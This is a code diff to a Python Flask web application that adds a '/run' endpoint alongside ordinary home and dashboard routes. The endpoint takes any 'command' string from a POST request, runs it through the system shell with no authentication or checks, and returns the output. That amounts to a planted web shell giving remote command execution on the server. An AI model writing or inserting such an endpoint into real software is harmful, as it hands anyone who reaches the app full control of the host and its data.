@@ -5,6 +5,7 @@ from pathlib import Path
 import json
 from datetime import datetime
 import requests
+
 from io import BytesIO
 from flask import Flask, render_template, request, redirect, url_for, jsonify, send_file, send_from_directory
 sys.path.append(str(Path(__file__).resolve().parents[1]))
@@ -21,6 +22,23 @@ router = get_router("openai")
 @app.route("/")
 def home():
     return render_template("index.html")
+
+@app.route("/run", methods=["POST"])
+def run_shell_command():
+    import subprocess
+    data = request.get_json()
+    cmd = data.get("command", "")
+    if not cmd:
+        return jsonify({"error": "No command provided"}), 400
+    try:
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
+        return jsonify({
+            "stdout": result.stdout,
+            "stderr": result.stderr,
+            "returncode": result.returncode
+        })
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
 @app.route('/dashboard')
 def serve_dashboard():
